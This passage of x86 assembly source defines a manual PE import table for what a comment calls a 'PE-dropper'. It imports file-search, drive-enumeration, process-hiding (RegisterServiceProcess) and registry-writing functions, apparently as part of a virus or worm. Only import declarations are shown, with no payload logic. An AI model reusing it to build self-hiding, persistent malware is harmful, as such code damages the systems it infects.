
; IMPORTs (for PE-dropper only)

import_start:           dd      im_lookup1-IMAGEBASE  ; im_lookuprva
                        dd      ?                     ; im_datetime
                        dd      -1                    ; im_forwardchain
                        dd      im_nam1-IMAGEBASE     ; im_namerva
                        dd      im_tbl1-IMAGEBASE     ; im_addresstablerva
                        ;;
                        dd      im_lookup2-IMAGEBASE
                        dd      ?
                        dd      -1
                        dd      im_nam2-IMAGEBASE
                        dd      im_tbl2-IMAGEBASE
                        ;;
                        dd      5 dup (0)
import_size             equ     $-import_start

im_lookup1:             dd      im_hint1_1-IMAGEBASE
                        dd      im_hint1_2-IMAGEBASE
                        dd      im_hint1_3-IMAGEBASE
                        dd      im_hint1_4-IMAGEBASE
                        dd      im_hint1_5-IMAGEBASE
                        dd      im_hint1_6-IMAGEBASE
                        dd      im_hint1_7-IMAGEBASE
                        dd      im_hint1_8-IMAGEBASE
                        dd      im_hint1_9-IMAGEBASE
                        dd      im_hint1_10-IMAGEBASE
                        dd      im_hint1_11-IMAGEBASE
                        dd      0

im_lookup2:             dd      im_hint2_1-IMAGEBASE
                        dd      im_hint2_2-IMAGEBASE
                        dd      im_hint2_3-IMAGEBASE
                        dd      0

im_nam1                 db      'KERNEL32.DLL',0
im_nam2                 db      'ADVAPI32.DLL',0

  ; really no need to use hint-word

im_hint1_1              db      0,0,'FindFirstFileA',0,0
im_hint1_2              db      0,0,'FindNextFileA',0,0
im_hint1_3              db      0,0,'FindClose',0,0
im_hint1_4              db      0,0,'GetFileAttributesA',0,0
im_hint1_5              db      0,0,'SetCurrentDirectoryA',0,0
im_hint1_6              db      0,0,'Sleep',0,0
im_hint1_7              db      0,0,'GetDriveTypeA',0,0
im_hint1_8              db      0,0,'GetCurrentProcessId',0,0
im_hint1_9              db      0,0,'RegisterServiceProcess',0,0
im_hint1_10             db      0,0,'GetCurrentProcess',0,0
im_hint1_11             db      0,0,'SetPriorityClass',0,0

im_hint2_1              db      0,0,'RegOpenKeyExA',0,0
im_hint2_2              db      0,0,'RegSetValueExA',0,0
im_hint2_3              db      0,0,'RegCloseKey',0,0

im_tbl1:
FindFirstFileA          dd      ?
FindNextFileA           dd      ?
FindClose               dd      ?
GetFileAttributesA      dd      ?
SetCurrentDirectoryA    dd      ?
Sleep                   dd      ?
GetDriveTypeA           dd      ?
GetCurrentProcessId     dd      ?
RegisterServiceProcess  dd      ?
GetCurrentProcess       dd      ?
SetPriorityClass        dd      ?
                        dd      0
                        
im_tbl2:
RegOpenKeyExA           dd      ?
RegSetValueExA          dd      ?
RegCloseKey             dd      ?
                        dd      0

